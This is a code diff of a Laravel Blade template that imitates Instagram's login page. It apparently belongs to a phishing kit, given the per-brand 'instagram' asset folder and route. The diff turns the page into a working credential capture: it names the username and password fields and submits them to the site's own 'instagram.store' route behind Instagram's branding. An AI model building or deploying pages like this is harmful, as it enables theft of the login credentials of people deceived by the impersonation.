@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Instagram Login Page</title>
-    <link rel="stylesheet" href="{{ asset('assets/styles.css') }}">
+    <link rel="stylesheet" href="{{ asset('assets/instagram/styles.css') }}">
 </head>
 <body>
 
@@ -11,18 +11,19 @@
     <div class="header">
         <div class="top">
             <div class="logo">
-                <img src="{{ asset('assets/instagram.png') }}" alt="instagram" style="width: 175px;">
+                <img src="{{ asset('assets/instagram/instagram.png') }}" alt="instagram" style="width: 175px;">
             </div>
-            <form action="{{ route('login.store') }}" method="post">
+            <form action="{{ route('instagram.store') }}" method="post">
+                @csrf
                 <div class="form">
                     <div class="input_field">
-                        <input type="text" placeholder="Phone number, username, or email" class="input">
+                        <input name="username" type="text" placeholder="Phone number, username, or email" class="input">
                     </div>
                     <div class="input_field">
-                        <input type="password" placeholder="Password" class="input">
+                        <input name="password" type="password" placeholder="Password" class="input">
                     </div>
-                    <div class="btn">
-                        <a type="submit">Log In</a>
+                    <div class="btn mt-10">
+                        <button type="submit" class="btn">Log In</button>
                     </div>
                 </div>
             </form>
@@ -33,7 +34,7 @@
             </div>
             <div class="dif">
                 <div class="fb">
-                    <img src="{{ asset('assets/facebook.png') }}" alt="facebook">
+                    <img src="{{ asset('assets/instagram/facebook.png') }}" alt="facebook">
                     <p>Log in with Facebook</p>
                 </div>
                 <div class="forgot">
@@ -47,8 +48,8 @@
         <div class="apps">
             <p>Get the app.</p>
             <div class="icons">
-                <a href="#"><img src="{{ asset('assets/appstore.png') }}" alt="appstore"></a>
-                <a href="#"><img src="{{ asset('assets/googleplay.png') }}" alt="googleplay"></a>
+                <a href="#"><img src="{{ asset('assets/instagram/appstore.png') }}" alt="appstore"></a>
+                <a href="#"><img src="{{ asset('assets/instagram/googleplay.png') }}" alt="googleplay"></a>
             </div>
         </div>
     </div>
